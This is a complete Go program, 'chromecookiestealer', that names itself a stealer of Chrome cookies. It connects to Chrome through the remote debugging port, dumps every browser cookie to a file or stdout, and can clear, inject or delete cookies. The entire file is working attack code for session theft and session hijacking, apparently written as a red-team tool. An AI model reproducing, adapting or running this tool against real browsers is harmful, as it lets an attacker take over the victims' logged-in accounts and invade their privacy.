// Program chromecookiestealer: A stealer of Chrome cookies.
package main

/*
 * chromecookiestealer.go
 * chromecookiestealer: A stealer of Chrome cookies.
 * By J. Stuart McMurray
 * Created 20230515
 * Last Modified 20230519
 */

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/storage"
	"github.com/chromedp/chromedp"
)

var (
	/* ProgramStart notes when the program has started for printing the
	elapsed time when the program ends. */
	ProgramStart = time.Now()

	/* Verbosef wil be a no-op if -verbose isn't given. */
	Verbosef = log.Printf

	DumpFile   string
	InjectFile string
	DeleteFile string
	DoClear    string /* Nonempty to default to clearing. */
)

// DCP wraps network.DeleteCookiesParams with a String method.
type DCP network.DeleteCookiesParams

// String implements fmt.Stringer.
func (d DCP) String() string {
	var sb strings.Builder
	fmt.Fprintf(&sb, "<name:%q", d.Name)
	if "" != d.URL {
		fmt.Fprintf(&sb, " url:%q", d.URL)
	}
	if "" != d.Domain {
		fmt.Fprintf(&sb, " domain:%q", d.Domain)
	}
	if "" != d.Path {
		fmt.Fprintf(&sb, " path:%q", d.Path)
	}
	sb.WriteRune('>')
	return sb.String()
}

// stdioFilename indicates we should use stdio and not a file.
const stdioFilename = "-"

var (
	/* stdinDec is a decoder which reads from stdin. */
	stdinDecoder     = json.NewDecoder(os.Stdin)
	stdinDecoderName = "stdin"
)

func main() {
	/* Command-line flags. */
	var (
		noSummary = flag.Bool(
			"no-summary",
			false,
			"Don't print a summary on exit",
		)
		verbOn = flag.Bool(
			"verbose",
			false,
			"Enable verbose logging",
		)
		chromeURL = flag.String(
			"chrome",
			"ws://127.0.0.1:9222",
			"Chrome remote debugging `URL`",
		)
		doClear = flag.Bool(
			"clear",
			"" != DoClear,
			"Clear browser cookies",
		)
	)
	flag.StringVar(
		&DumpFile,
		"dump",
		DumpFile,
		"Name of `file` to which to dump stolen cookies",
	)
	flag.StringVar(
		&InjectFile,
		"inject",
		InjectFile,
		"Name of `file` containing cookies to inject",
	)
	flag.StringVar(
		&DeleteFile,
		"delete",
		DeleteFile,
		"Name of `file` containing parameters for cookies to delete",
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options]
Attaches to Chrome using the Remote DevTools Protocol (--remote-debugging-port)
and, in order and as requested:

- Dumps cookies
- Clears cookies
- Injects cookies
- Deletes selected cookies

Parameters for cookies to be deleted should be represented as an array of JSON
objects with the following string fields:

name   - Name of the cookies to remove.
url    - If specified, deletes all the cookies with the given name where domain
         and path match provided URL.
domain - If specified, deletes only cookies with the exact domain.
path   - If specified, deletes only cookies with the exact path.

Filenames may also be "-" for stdin/stdout.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Work out verbose logging. */
	if !*verbOn {
		Verbosef = func(string, ...any) {}
	}

	/* Make sure we're doing something. */
	if "" == DumpFile && !*doClear && "" == InjectFile &&
		"" == DeleteFile {
		log.Fatalf(
			"Nothing to do; need -save, -clear, " +
				"-load, and/or -delete",
		)
	}

	/* Attach to Chrome. */
	actx, acancel := chromedp.NewRemoteAllocator(
		context.Background(),
		*chromeURL,
	)
	defer acancel()
	cctx, ccancel := chromedp.NewContext(actx)
	defer ccancel()
	browser, err := chromedp.FromContext(cctx).Allocator.Allocate(cctx)
	if nil != err {
		log.Fatalf("Error connecting to browser: %s", err)
	}
	xctx := cdp.WithExecutor(context.Background(), browser)

	/* Do the things requested by the user. */
	if "" != DumpFile {
		if err := save(xctx); nil != err {
			log.Fatalf("Error saving cookies: %s", err)
		}
	}
	if *doClear {
		if err := clear(xctx); nil != err {
			log.Fatalf("Error clearing cookies: %s", err)
		}
	}
	if "" != InjectFile {
		if err := load(xctx); nil != err {
			log.Fatalf("Error loading cookies: %s", err)
		}
	}
	if "" != DeleteFile {
		if err := del(xctx); nil != err {
			log.Fatalf("Error deleting cookies: %s", err)
		}
	}

	/* All done. */
	if !*noSummary {
		log.Printf(
			"Done in %s.",
			time.Since(ProgramStart).Round(time.Millisecond),
		)
	}
}

// save saves the cookies to DumpFile.
func save(ctx context.Context) error {
	/* Grab the cookies. */
	cookies, err := storage.GetCookies().Do(ctx)
	if nil != err {
		return fmt.Errorf("getting cookies from browser: %w", err)
	}
	Verbosef("Got %d cookies from browser", len(cookies))

	/* Work out where we're saving cookies. */
	var (
		w  io.Writer
		fn string
	)
	if stdioFilename == DumpFile {
		w = os.Stdout
		fn = "stdout"
	} else {
		f, err := os.Create(DumpFile)
		if nil != err {
			return fmt.Errorf("opening savefile: %w", err)
		}
		defer f.Close()
		w = f
		fn = f.Name()
	}

	/* Save them. */
	enc := json.NewEncoder(w)
	enc.SetIndent("", "\t")
	if err := enc.Encode(cookies); nil != err {
		return fmt.Errorf("writing cookies to savefile: %w", err)
	}
	log.Printf("Wrote %d cookies to %s", len(cookies), fn)

	return nil
}

// clear clears the browser's cookies.
func clear(ctx context.Context) error {
	if err := storage.ClearCookies().Do(ctx); nil != err {
		return err
	}
	log.Printf("Cleared browser cookies")
	return nil
}

// load loads cookies into the browser from InjectFile.
func load(ctx context.Context) error {
	/* Get the cookies to load. */
	var cookies []*network.CookieParam
	dec, name, cf, err := jsonDecoder(InjectFile)
	if nil != err {
		return fmt.Errorf(
			"preparing to read from %s: %w",
			InjectFile,
			err,
		)
	}
	defer cf()
	if err := dec.Decode(&cookies); nil != err {
		return fmt.Errorf("reading cookies from %s: %w", name, err)
	}
	Verbosef("Read %d cookies from %s", len(cookies), name)

	/* Stick them in the browser. */
	if err := storage.SetCookies(cookies).Do(ctx); nil != err {
		return fmt.Errorf("loading cookies into browser: %w", err)
	}
	log.Printf("Set %d cookies in browser", len(cookies))

	return nil
}

// del deletes cookies from DeleteFile.
func del(ctx context.Context) error {
	/* Get the cookies parameters to delete. */
	var params []DCP
	dec, name, cf, err := jsonDecoder(DeleteFile)
	if nil != err {
		return fmt.Errorf(
			"preparing to read from %s: %w",
			InjectFile,
			err,
		)
	}
	defer cf()
	if err := dec.Decode(&params); nil != err {
		return fmt.Errorf("reading parameters from %s: %w", name, err)
	}
	Verbosef("Read %d parameters from %s", len(params), name)

	/* Ask the browser to delete cookies. */
	var nSuc int
	for _, p := range params {
		if err := (*network.DeleteCookiesParams)(
			&p,
		).Do(ctx); nil != err {
			log.Printf(
				"Error deleting cookie with parameters %s: %s",
				p,
				err,
			)
		} else {
			nSuc++
		}
	}
	log.Printf("Deleted cookies with %d/%d parameters", nSuc, len(params))
	return nil /* Errors logged above. */
}

// jsonDecoder returns a json.Decoder which reads from the file named f, or
// from stdin if f is stdinFilename.  The name of the file is also returned.
// The returned function should be called to close the file.
func jsonDecoder(name string) (*json.Decoder, string, func() error, error) {
	/* If we're reading from stdin, life's easy. */
	if stdioFilename == name {
		return stdinDecoder,
			stdinDecoderName,
			func() error { return nil },
			nil
	}

	/* Prepare to read from a file. */
	f, err := os.Open(name)
	if nil != err {
		return nil, "", nil, fmt.Errorf("opening: %w", err)
	}
	return json.NewDecoder(f), f.Name(), f.Close, nil
}
